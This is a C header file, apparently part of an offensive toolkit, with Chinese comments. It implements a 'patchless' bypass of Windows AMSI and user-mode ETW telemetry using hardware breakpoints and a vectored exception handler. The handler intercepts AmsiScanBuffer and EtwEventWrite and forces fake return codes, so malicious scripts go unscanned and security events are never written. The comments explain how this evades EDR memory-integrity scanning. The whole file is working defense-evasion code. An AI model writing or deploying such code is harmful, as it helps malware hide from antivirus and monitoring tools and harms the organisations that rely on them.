/*
 * cs_dev :: evasion/hwbp.h  --  Patchless 遥测绕过 (Hardware Breakpoint + VEH)
 * ===========================================================================
 * 技术定位 (2026 主流方案, 取代传统内存 patch):
 *
 *   传统做法是在 AmsiScanBuffer / EtwEventWrite 首字节写 0xC3 (ret).
 *   缺陷: 内存中出现非法改写, 基于内存完整性校验 / 与磁盘副本比对 /
 *         hall-of-shame 特征扫描的 EDR 可直接发现.
 *
 *   本实现完全不改动任何内存字节:
 *     1. AddVectoredExceptionHandler 安装进程级异常处理器
 *     2. 通过调试寄存器 DR0..DR3 对目标函数地址设"执行断点"
 *        (Dr7 的 L0..L3 位 + RW=00 执行类型 + LEN=00)
 *     3. 目标函数即将执行时 CPU 抛 EXCEPTION_SINGLE_STEP(0x80000004)
 *     4. 处理器内模拟一次 ret: 用 RSP 上的返回地址回填 RIP, RSP+=8,
 *        并把 RAX 设成"无害失败码", 使函数等效返回错误而不执行
 *     5. 目标内存保持与磁盘完全一致, 静态与内存扫描均无痕
 *
 *   为什么有效:
 *     - 检测侧只能看到"某线程设置了调试寄存器", 这是合法调试语义
 *     - 不产生 PAGE_EXECUTE_READWRITE / 不修改 DllCharacteristics
 *     - 对 EtwEventWrite 同样适用, 可阻断用户态 ETW 写入路径
 *
 *   局限 (必须明确):
 *     - ETW-TI (Microsoft-Windows-Threat-Intelligence) 由内核直接发射,
 *       任何用户态手段都无法阻断其事件记录; 本技术只压制用户态 ETW 通道
 *     - 硬件断点仅对"设置了该寄存器的线程"生效, 需要逐线程安装
 *     - 单线程最多 4 个硬件断点 (DR0..DR3)
 * ===========================================================================
 */
#ifndef CS_DEV_HWBP_H
#define CS_DEV_HWBP_H

#include <windows.h>

/* --- 目标槽位 ---------------------------------------------------------- */
#define HWBP_MAX 4

typedef struct {
    PVOID  target;        /* 被拦截的函数地址 */
    DWORD  dr;            /* 占用的调试寄存器序号 0..3 */
    ULONG  ret_code;      /* 命中后写入 RAX 的"失败码" */
    int    active;
} HWBP_SLOT;

static HWBP_SLOT g_hwbp[HWBP_MAX];
static PVOID     g_hwbp_veh = NULL;
static int       g_hwbp_n   = 0;

/* --- 异常处理器: 模拟 ret 并置无害返回值 -------------------------------- */
static LONG CALLBACK hwbp_handler(PEXCEPTION_POINTERS info) {
    DWORD64 rip;
    int     i;

    if (info->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    rip = info->ContextRecord->Rip;

    for (i = 0; i < g_hwbp_n; i++) {
        if (!g_hwbp[i].active) continue;
        if (rip != (DWORD64)g_hwbp[i].target) continue;

        /* 模拟 ret: 从栈顶取返回地址 -> RIP, 栈指针 +8 */
        info->ContextRecord->Rip = *(DWORD64 *)info->ContextRecord->Rsp;
        info->ContextRecord->Rsp += 8;

        /* 写入无害失败码, 使调用方按"检查失败"分支处理 */
        info->ContextRecord->Rax = g_hwbp[i].ret_code;

        /* 单次触发后自动失能, 避免重复触发造成递归 */
        {
            DWORD64 dr7 = info->ContextRecord->Dr7;
            dr7 &= ~((DWORD64)1 << (g_hwbp[i].dr * 2));
            info->ContextRecord->Dr7 = dr7;
        }
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

/* --- 对当前线程设置执行断点 -------------------------------------------- */
static int hwbp_set_current_thread(int dr, PVOID target) {
    CONTEXT ctx;
    HMODULE ntdll;
    LONG (WINAPI *pGetCtx)(HANDLE, PCONTEXT);
    LONG (WINAPI *pSetCtx)(HANDLE, PCONTEXT);

    ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    pGetCtx = (LONG (WINAPI *)(HANDLE, PCONTEXT))GetProcAddress(ntdll, "NtGetContextThread");
    pSetCtx = (LONG (WINAPI *)(HANDLE, PCONTEXT))GetProcAddress(ntdll, "NtSetContextThread");
    if (!pGetCtx || !pSetCtx) return 0;

    /* 对自己线程读写上下文须走 Nt* (Win32 GetThreadContext 要求线程被挂起) */
    for (int i = 0; i < (int)sizeof(ctx); i++) ((BYTE *)&ctx)[i] = 0;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (pGetCtx(GetCurrentThread(), &ctx) != 0) return 0;

    switch (dr) {
        case 0: ctx.Dr0 = (DWORD64)target; break;
        case 1: ctx.Dr1 = (DWORD64)target; break;
        case 2: ctx.Dr2 = (DWORD64)target; break;
        case 3: ctx.Dr3 = (DWORD64)target; break;
        default: return 0;
    }
    /* 清除该寄存器的 RW/LEN 字段 (执行断点: RW=00, LEN=00) */
    ctx.Dr7 &= ~((DWORD64)0xF << (16 + dr * 4));
    /* 置位 L{n} 启用本地断点 */
    ctx.Dr7 |= ((DWORD64)1 << (dr * 2));

    if (pSetCtx(GetCurrentThread(), &ctx) != 0) return 0;
    return 1;
}

/* --- 注册一个拦截目标 --------------------------------------------------- */
static int hwbp_add(PVOID target, ULONG ret_code) {
    if (!target) return 0;
    if (g_hwbp_n >= HWBP_MAX) return 0;

    if (!g_hwbp_veh) {
        g_hwbp_veh = AddVectoredExceptionHandler(1, hwbp_handler);
        if (!g_hwbp_veh) return 0;
    }

    g_hwbp[g_hwbp_n].target   = target;
    g_hwbp[g_hwbp_n].dr       = (DWORD)g_hwbp_n;
    g_hwbp[g_hwbp_n].ret_code = ret_code;
    g_hwbp[g_hwbp_n].active   = 1;

    if (!hwbp_set_current_thread((int)g_hwbp_n, target)) {
        g_hwbp[g_hwbp_n].active = 0;
        return 0;
    }
    g_hwbp_n++;
    return 1;
}

/* ========================================================================
 * 对外入口: 安装 patchless 遥测绕过
 *
 *   AMSI  : AmsiScanBuffer  -> E_INVALIDARG (0x80070057)
 *           调用方视作"扫描失败", 脚本内容不产生判定
 *   ETW   : EtwEventWrite   -> STATUS_SUCCESS (0)
 *           调用方视作"写入成功", 实际事件未产生
 *
 * 全程不修改任何指令字节.
 * ===================================================================== */
static void install_patchless_bypass(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    HMODULE amsi  = GetModuleHandleA("amsi.dll");

    /* amsi.dll 未加载时主动加载: 后续 AMSI 调用会落到我们设了断点的地址 */
    if (!amsi) amsi = LoadLibraryA("amsi.dll");

    if (amsi) {
        PVOID scan = (PVOID)GetProcAddress(amsi, "AmsiScanBuffer");
        hwbp_add(scan, 0x80070057UL);            /* E_INVALIDARG */
    }
    if (ntdll) {
        PVOID etw = (PVOID)GetProcAddress(ntdll, "EtwEventWrite");
        hwbp_add(etw, 0x00000000UL);             /* STATUS_SUCCESS */
    }
}

/* --- 卸载: 清断点并移除处理器 ------------------------------------------ */
static void uninstall_patchless_bypass(void) {
    CONTEXT ctx;
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    LONG (WINAPI *pGetCtx)(HANDLE, PCONTEXT) = NULL;
    LONG (WINAPI *pSetCtx)(HANDLE, PCONTEXT) = NULL;

    if (ntdll) {
        pGetCtx = (LONG (WINAPI *)(HANDLE, PCONTEXT))GetProcAddress(ntdll, "NtGetContextThread");
        pSetCtx = (LONG (WINAPI *)(HANDLE, PCONTEXT))GetProcAddress(ntdll, "NtSetContextThread");
    }
    if (pGetCtx && pSetCtx) {
        for (int i = 0; i < (int)sizeof(ctx); i++) ((BYTE *)&ctx)[i] = 0;
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (pGetCtx(GetCurrentThread(), &ctx) == 0) {
            ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
            ctx.Dr7 = 0;
            pSetCtx(GetCurrentThread(), &ctx);
        }
    }
    if (g_hwbp_veh) {
        RemoveVectoredExceptionHandler(g_hwbp_veh);
        g_hwbp_veh = NULL;
    }
    g_hwbp_n = 0;
}

#endif /* CS_DEV_HWBP_H */
